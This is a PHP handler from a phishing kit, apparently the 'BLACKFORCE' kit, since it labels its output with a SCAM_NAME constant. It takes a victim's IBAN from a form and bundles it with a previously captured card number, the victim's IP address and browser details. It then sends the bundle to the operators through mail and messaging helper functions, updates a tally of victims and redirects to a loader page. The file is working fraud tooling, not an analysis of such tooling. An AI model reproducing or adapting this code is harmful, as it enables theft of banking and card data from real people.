<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['siban'] = htmlspecialchars($_POST['iban']);

if(empty($_SESSION['siban'])) {
    header("Location: ../iban.php?page=error&userid={$id}&ue={$ue}");
}
else {
        
    $subject = "🔷 CODE IBAN ".SCAM_NAME." ".FLAG."FROM: $ip";
    $rezdata = "🔷 CODE MAIL ".SCAM_NAME." ".FLAG."
    
🔷 CODE IBAN : ".$_SESSION['siban']."

💳 CARD : ".$_SESSION['sccn']."
    
⏰ TIME : ".date("Y-m-d H:i:s")."
🌐 IP : $ip
💠 OS : $agent
    
⚡️ BLACKFORCE™ ⚡️
";
    
    $maildata = $rezdata;
    
    
    sendIban($rezdata);
        
    sendMail($maildata);

    $file = '../Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['mails']++;
    update_ini($data, $file);

    header("Location: ../loader.php?userid={$id}&ue={$ue}");
}

}
// SMS Config END